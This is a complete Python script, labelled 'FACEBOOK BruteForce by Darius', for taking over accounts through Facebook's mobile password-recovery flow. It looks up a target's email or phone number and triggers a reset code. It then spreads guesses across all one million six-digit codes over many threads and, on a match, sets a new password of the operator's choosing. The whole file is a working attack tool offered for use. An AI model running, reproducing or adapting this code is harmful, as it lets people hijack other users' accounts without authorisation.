#coding: utf-8
import requests, sys, os, re, random, json
from multiprocessing.pool import ThreadPool
logo=""" \033[1;92m███████╗ █████╗  ██████╗███████╗██████╗  ██████╗  ██████╗ ██╗  ██╗
██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██║ ██╔╝
█████╗  ███████║██║     █████╗  ██████╔╝██║   ██║██║   ██║█████╔╝
██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗██║   ██║██║   ██║██╔═██╗
██║     ██║  ██║╚██████╗███████╗██████╔╝╚██████╔╝╚██████╔╝██║  ██╗
╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
BruteForce by Darius:"""
if sys.platform == "linux" or sys.platform == "linux2":
    clr="clear"
elif sys.platform == "win32" or sys.platform == "cygwin" or sys.platform == "msys":
    clr="cls"
if sys.version_info[0] != 3:
  os.system('clear')
  print(logo)
  print(65 * '\033[1;92m=')
  print('''\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 fb.py\n''')
  print(65 * '\033[1;92m=')
  sys.exit()
session=requests.Session()
header={'Connection': 'keep-alive','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"','sec-ch-ua-mobile': '?0','User-Agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'}
RUN = True
def form():
  global header
  COOKIES = {"m_pixel_ratio":"3", "locale":"tl_PH", "wd": "980x1851"}
  url=("https://m.facebook.com:443")
  web=session.get(url, headers=header)
  URL = re.findall(r'href="/recover/(.*?)"',web.text).pop(0)
  URL = ("https://m.facebook.com:443/recover/{}".format(str(URL)))
  for i in web.cookies:
    COOKIES[i.name]=i.value
  return COOKIES, URL, web.url
def get_data():
  global header
  COOKIES, URL, rd = form()
  header['Referer'] = rd
  web=session.get(URL, headers=header, cookies=COOKIES)
  cookies=dict()
  FORM={"lsd":"AVqTGX-hM9Y","jazoest":"2879","email":"1234","did_submit":"Maghanap"}
  URL=("https://m.facebook.com:443"+re.findall(r'<form method="post" action="(.*?)" id=', web.text).pop(0))
  FORM["lsd"]=re.findall(r'name="lsd" value="(.*?)"', web.text).pop(0)
  FORM["jazoest"]=re.findall(r'name="jazoest" value="(.*?)"', web.text).pop(0)
  try:
    FORM["did_submit"] = re.findall(r'type="submit" value="(.*?)"', web.text).pop(0)
  except:
    pass
  for i in web.cookies:
    COOKIES[i.name] = i.value
  return COOKIES, URL, FORM, web.url
def search():
  global header
  while True:
    COOKIES, url, form, rd = get_data()
    FORM = dict()
    form['email']=str(user)
    header['Referer']=rd
    web=session.post(url, headers=header, data=form, cookies=COOKIES)
    if "The phone number or email you entered doesn't match an account. Please try again or" in web.text or "Hindi nagbalik ng anumang mga resulta. Pakisubukang muli gamit ang ibang impormasyon." in web.text:
      print("No Found")
      input()
      sys.exit()
    elif "Hindi tumutugma sa account ang inilagay mong numero ng telepono o email. Pakisubukan muli o" in web.text:
      print("Search no found")
      input()
      sys.exit()
    else:
      try:
        another = ("https://m.facebook.com:443/recover"+re.findall(r'<a href="/recover(.*?)" role', web.text).pop(0))
        for i in web.cookies:
          COOKIES[i.name] = i.value
        COOKIES, FORM, URL, RD = try_another(COOKIES, another, web.url)
        return COOKIES, FORM, URL, RD
      except:
        try:
          first_method=re.findall(r'name="recover_method" value="(.*?)"', web.text).pop(0)
          if first_method[:8] == "send_sms" or first_method[:10] == "send_email":
            FORM['recover_method'] = first_method
            FORM['lsd'] = re.findall(r'name="lsd" value="(.*?)"', web.text).pop(0)
            FORM['jazoest'] = re.findall(r'name="jazoest" value="(.*?)"', web.text).pop(0)
            ACTION =('https://m.facebook.com:443'+re.findall(r'<form method="post" action="(.*?)" id=', web.text).pop(0))
            for i in web.cookies:
              COOKIES[i.name] = i.value
            return COOKIES, FORM, ACTION, web.url
          
          else:
            print("\033[1;92m No recover method found")
            input()
            sys.exit()
        except:
          print("\033[1;92m No recover method found")
          input()
          sys.exit()
        
def try_another(COOKIES, url, rd):
  global header
  FORM = dict()
  header['Referer'] = rd
  url = url.replace('amp;', '')
  web = session.get(url, headers=header, cookies=COOKIES)
  method = re.findall(r'name="recover_method" value="(.*?)"', web.text)
  for lis in range(len(method)):
    print("[{}] {}".format(str(lis),str(method[lis][:17])))
  if len(method) == 0:
    input("No recover method")
    sys.exit()
  inp = pick()
  print(67 * '\033[1;92m=')
  FORM['recover_method'] = method[int(inp)]
  FORM['lsd'] = re.findall(r'name="lsd" value="(.*?)"', web.text).pop(0)
  FORM['jazoest'] = re.findall(r'name="jazoest" value="(.*?)"', web.text).pop(0)
  FORM['reset_action'] = re.findall(r'type="submit" value="(.*?)"', web.text).pop(0)
  ACTION =('https://m.facebook.com:443'+re.findall(r'<form method="post" action="(.*?)" id=', web.text).pop(0))
  ACTION = ACTION.replace("amp;", "")
  for i in web.cookies:
    COOKIES[i.name] = i.value
  return COOKIES, FORM, ACTION, web.url
def send_req():
  FORMS = dict()
  COOKIES, FORM, URL, RD = search()
  header['Referer'] = RD
  while True:
    try:
      web = session.post(URL, headers=header, cookies=COOKIES, data=FORM)
      for i in web.cookies:
        COOKIES[i.name]=i.value
      URL = ("https://m.facebook.com:443"+re.findall(r'<form method="post" action="(.*?)" id=', web.text).pop(0))
      FORMS['lsd']=re.findall(r'name="lsd" value="(.*?)"', web.text).pop(0)
      FORMS['jazoest']=re.findall(r'name="jazoest" value="(.*?)"', web.text).pop(0)
      FORMS['reset_action'] = re.findall(r'type="submit" value="(.*?)"', web.text).pop(0)
      URL = URL.replace("amp;", "")
      ok = open("urls.txt", "w")
      ok.write(str(URL))
      ok.close()
      a = open("cookies.json", "w")
      json.dump(COOKIES, a)
      a.close()
      a = open("form.json", "w")
      json.dump(FORMS, a)
      a.close()
      return True
    except:
      pass
def pick():
  data=input('input :\033[1;97m')
  return data
def machine_generator():
  passcode=[]
  for i in range(1000000):
    if len(str(i)) == 1:
      passcode.append("0"+"0"+"0"+"0"+"0"+str(i))
    elif len(str(i)) == 2:
      passcode.append("0"+"0"+"0"+"0"+str(i))
    elif len(str(i)) == 3:
      passcode.append("0"+"0"+"0"+str(i))
    elif len(str(i)) == 4:
      passcode.append("0"+"0"+str(i))
    elif len(str(i)) == 5:
      passcode.append("0"+str(i))
    else:
      passcode.append(str(i))
  return passcode
def machine_change_pass(url, s, form):
  header['Referer']=open("cach.txt", "r").read()
  try:
    web=s.post(url, headers=header, data=form)
    print(web.text)
    return True
  except:
    return False
def machine_sender(forms, s, url):
  while True:
    try:
      web = s.post(url, headers=header, data=forms)
      return web, s
    except:
      pass
def elsi(web, body):
  url = ("https://m.facebook.com:443"+re.findall(r'<form method="post" action="(.*?)" id=', web.text).pop(0))
  url = url.replace("amp;", "")
  body['lsd']=re.findall(r'name="lsd" value="(.*?)"', web.text).pop(0)
  body['jazoest'] = re.findall(r'name="jazoest" value="(.*?)"', web.text).pop(0)
 # FORMS['reset_action'] = 'Magpatuloy'
  body['reset_action'] = re.findall(r'<button type="submit" value="(.*?)"', web.text).pop(0)
  return body, url
def machine_found(web):
  form=dict()
  form['lsd']=re.findall(r'name="lsd" value="(.*?)"', web.text).pop(0)
  form['jazoest']=re.findall(r'name="jazoest" value="(.*?)"', web.text).pop(0)
  form['password_new']=str(userpass)
  ac_url=('https://m.facebook.com:443'+re.findall(r'form method="post" action="(.*?)">', web.text).pop(0))
  ac_url=ac_url.replace("amp;", "")
  return ac_url, form
def hackie(arg):
  global RUN, session, codelist, total
  body = json.loads(open("form.json", "r").read())
  cookie = json.loads(open("cookies.json", "r").read())
  header['Referer']=open("cach.txt", "r").read()
  url = open("cach.txt", "r").read()
  pin =random.choice(codelist)
  while bool(RUN) == True:
    try:
      if len(codelist) == 1000000:
        pass
      else:
        sys.stdout.write(u'\033[1000D\033[1;97m {}/1000000  \033[1;92m {}'.format(str(total), str(pin)))
        sys.stdout.flush()
      body["n"]=str(pin)
      web = session.post(url, headers = header, cookies = cookie, data = body)
      if 'password_new' in web.text:
        RUN = False
        print("\r\r\nFOUND CODE {}".format(str(pin)))
        ac_url, form = machine_found(web)
        if machine_change_pass(ac_url, session, form):
          print("DONE CHANGE PASSWORD {}".format(str(userpass)))
          return
        else:
          print("\nERROR CHANGE PASSWORD\nTRY MANUAL")
          return
      elif re.findall(r'<title>(.*?)</title>', web.text).pop(0) == 'Error':
        RUN = False
        return
      else:
        body, url = elsi(web, body)
        header['Referer'] = web.url
        try:
          codelist.remove(str(pin))
          pin = random.choice(codelist)
        except:
          pass
        total+=1
    except:
      pass
  return
total = 0
os.system(clr)
print(logo)
print(67 * '\033[1;92m=')
print("email/number:")
user =pick()
print("\033[1;92mpassword if gotten")
userpass = pick()
print("\033[1;92mThreads")
threads = pick()
print('\npassword to change = {}'.format(userpass))
codelist = machine_generator()
if __name__=="__main__":
  print(67 * '\033[1;92m=')
  if send_req():
    p=ThreadPool(int(threads))
    p.map(hackie, range(int(threads)))
    print("\033[1;97m DONE")